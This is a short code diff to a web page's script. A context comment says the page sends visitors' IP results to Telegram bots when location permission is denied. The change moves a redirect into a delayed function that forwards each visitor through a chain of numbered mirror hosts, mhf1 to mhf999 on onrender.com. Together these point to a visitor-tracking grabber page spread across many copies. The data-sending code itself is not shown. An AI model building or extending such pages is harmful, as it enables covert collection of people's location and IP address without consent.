@@ -15,25 +15,8 @@
           // Location permission denied, send IP result to Telegram bots
         
 //////1//////
-        // Get the current URL
-var currURL = window.location.href;
-
-// Extract the current number from the URL
-var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
-
-// Check if the current number is less than or equal to 99
-if (currNum <= 999) {
-  // Increment the current number by 1
-  var nextNum = currNum + 1;
-  // Replace the current number in the URL with the next number
-  var nextURL = currURL.replace(/mhf(\d+)/, 'mhf' + nextNum);
-  // Redirect to the next URL
-  window.location.href = nextURL;
-} else {
-  // If the current number is 999 or greater, redirect to the first URL
-  window.location.href = 'https://mhf1.onrender.com/';
-}
-
+       // Redirect to the next URL
+        setTimeout(redirectToNextURL,3000);
 //////1//////
         }
       }
@@ -110,6 +93,33 @@ if (currNum <= 999) {
       }),
     });
   }
+
+
+
+function redirectToNextURL() {
+  // Get the current URL
+  var currURL = window.location.href;
+
+  // Extract the current number from the URL
+  var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
+
+  // Check if the current number is less than or equal to 999
+  if (currNum <= 999) {
+    // Increment the current number by 1 and construct the next URL
+    var nextNum = currNum + 1;
+    var nextURL = currURL.replace(/mhf\d+/, 'mhf' + nextNum);
+
+    // Redirect to the next URL
+    window.location.href = nextURL;
+  } else {
+    // If the current number is greater than 999, display an alert message
+   // alert('You have reached the maximum number of URLs.');
+window.location.href = 'https://mhf1.onrender.com/';
+  }
+}
+
+
+
 </script>
 
 <main>
